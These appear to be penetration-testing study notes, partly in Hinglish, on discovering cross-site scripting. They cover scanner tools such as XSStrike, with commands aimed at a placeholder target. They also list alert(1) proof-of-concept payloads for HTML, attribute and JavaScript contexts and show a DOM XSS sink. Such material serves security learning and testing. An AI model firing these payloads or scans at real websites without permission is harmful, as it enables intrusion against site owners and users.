# Automated Discovery
Tools:
Burp Suite
OWASP ZAP
Nessus
XSStrike

 Scanners perform:

Passive Scan → checks JS (DOM issues)
Active Scan → sends payloads

Tools send payloads & check reflection in response

## XSStrike Usage
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py

## Run Scan:
python xsstrike.py -u "http://target.com/?param=test"

## Output Meaning:
Testing parameter: email
Reflections found: 1

👉 Reflection = Possible XSS
👉 Always manually verify


# Manual Discovery
Step 1: Find Inputs
Forms
URL parameters
Headers (Cookie, User-Agent)

📌 XSS headers me bhi possible hai

Step 2: Test Payloads
Basic:
<script>alert(1)</script>

Advanced Payloads:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
%3Cscript%3Ealert(1)%3C/script%3E



## Injection Context (VERY IMPORTANT)
### 1. HTML Context
Hello USER_INPUT

Payload:

<script>alert(1)</script>

### 2. Attribute Context
<input value="USER_INPUT">

Payload:

" onfocus=alert(1) "

### 3. JavaScript Context
var x = "USER_INPUT";

Payload:

";alert(1);//
🔹 Code Review (Pro Method)

### 📌 Most reliable method

Check:

Source → user input
Sink → where rendered
Example:
document.innerHTML = userInput;

👉 Vulnerable (DOM XSS)


